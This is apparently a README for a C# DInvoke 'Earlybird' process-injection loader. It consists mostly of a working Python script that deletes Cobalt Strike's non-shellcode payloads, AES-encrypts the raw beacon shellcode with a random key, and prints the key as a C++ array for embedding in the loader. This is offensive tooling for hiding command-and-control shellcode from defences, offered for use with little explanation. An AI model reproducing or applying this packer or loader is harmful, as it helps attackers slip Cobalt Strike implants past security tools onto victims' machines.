# CSharp DInvoke Earlybird Loader

A quick and dirty CSharp DInvoke loader I was experimenting with for my own knoweldge.

## Notes

Can be used with the following python to generate encrypted cobalt strike bins for earlybird injection.

```python
#!/usr/bin/env python3

import sys
import os
import subprocess
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
from pathlib import Path

"""
This script takes in the output folder from Cobalt Strikes generate all payloads function, removes all but raw shellcode
and then encrypts each one with a random 32byte key.  All encrypted files are saved with a .encrypted extension and the key
to decrypt is saved as key.encrypted
"""

def AESencrypt(plaintext, random):
    k = hashlib.sha256(random).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,random

def dropEncryptedShellcode(file, ciphertext):
  with open(file+".encrypted", "wb") as fc:
    fc.write(ciphertext)
    #print('unsigned char AESshellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

def dropEncryptedKey(keyPath, random):
  with open(keyPath, "wb") as fk:
    fk.write(random)

if len(sys.argv) == 1:
   print("[!] You need to specify the folder to build the payloads from. :/")
   sys.exit()
	

path = Path(sys.argv[1])
glob_path = path.glob('*')

random = urandom(32)
print("[+] Using " + str(path)+"/")
print("[+] Removing *.exe, *.dll and *.ps1 files from " + str(path))

for file_path in glob_path:
    if str(file_path).endswith(".exe"):
        os.remove(file_path)
    if str(file_path).endswith(".dll"):
        os.remove(file_path)
    if str(file_path).endswith(".ps1"):
        os.remove(file_path)
    if str(file_path).endswith(".bin"):
        file = open(file_path, "rb")
        content = file.read()

        ciphertext, random = AESencrypt(content,random)
        file = str(file_path)
        print("[+] Writing encrypted version to " + file + ".encrypted")
        dropEncryptedShellcode(file,ciphertext)


keyPath = str(path) + "/key.encrypted"
dropEncryptedKey(keyPath,random)
print("[+] Writing key to " + keyPath)
print("[+] Please see below C++ key output for embedded payloads")
print('char AESKey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in random) + ' };')%     
```

## Authors and acknowledgment

carl0s